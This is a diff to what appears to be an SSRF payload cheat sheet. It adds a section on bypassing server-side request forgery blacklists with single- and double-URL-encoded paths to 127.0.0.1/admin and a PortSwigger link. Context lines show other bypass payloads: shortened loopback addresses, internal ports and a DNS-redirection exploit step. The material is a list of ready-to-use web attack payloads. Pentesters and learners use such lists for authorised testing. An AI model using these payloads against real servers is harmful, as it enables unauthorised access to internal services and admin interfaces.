@@ -15,6 +15,7 @@
   * [Bypass using IPv6/IPv4 Address Embedding](#bypass-using-ipv6ipv4-address-embedding)
   * [Bypass using malformed urls](#bypass-using-malformed-urls)
   * [Bypass using rare address](#bypass-using-rare-address)
+  * [Bypass using URL encoding](#bypass-using-url-encoding)
   * [Bypass using bash variables](#bypass-using-bash-variables)
   * [Bypass using tricks combination](#bypass-using-tricks-combination)
   * [Bypass using enclosed alphanumerics](#bypass-using-enclosed-alphanumerics)
@@ -76,7 +77,7 @@ http://localhost:443
 http://localhost:22
 ```
 
-Advanced exploit using a redirection
+Advanced exploit [using a redirection](https://portswigger.net/web-security/ssrf#bypassing-ssrf-filters-via-open-redirection)
 
 ```powershell
 1. Create a subdomain pointing to 192.168.0.1 with DNS A record  e.g:ssrf.example.com
@@ -175,6 +176,15 @@ You can short-hand IP addresses by dropping the zeros
 http://0/
 http://127.1
 http://127.0.1
+```
+
+### Bypass using URL encoding
+
+[Single or double encode a specific URL to bypass blacklist](https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter)
+
+```powershell
+http://127.0.0.1/%61dmin
+http://127.0.0.1/%2561dmin
 ```
 
 ### Bypass using bash variables 
